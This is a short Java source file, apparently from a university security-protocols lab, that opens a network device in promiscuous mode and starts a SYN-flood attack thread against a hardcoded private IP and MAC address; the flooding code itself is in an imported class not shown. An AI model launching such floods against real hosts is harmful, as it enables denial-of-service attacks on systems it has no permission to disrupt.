package test;

import java.io.IOException;

import org.jnetpcap.Pcap;
import org.jnetpcap.PcapIf;

import com.upec.securityProtocols.attacks.SynFlood;
import com.upec.securityProtocols.communications.Output;
import com.upec.securityProtocols.communications.PcapUtils;

public class App5 {

    public static void main( String[] args ) throws IOException {
        StringBuilder errors = new StringBuilder();
        PcapIf device = PcapUtils.getDevice( "eth", errors );
        Pcap pcap = PcapUtils.createPcap( device, Pcap.MODE_PROMISCUOUS, errors );
        Output out = new Output( pcap );
        byte[] targetMac = new byte[] { 0x10, 0x0b, (byte) 0xa9, (byte) 0x9e, 0x71, (byte) 0xbc };
        byte[] targetIP = new byte[] { (byte) 192, (byte) 168, 2, 2 };
        Thread t = new Thread( new SynFlood( targetMac, targetIP, out ) );
        t.start();
    }

}
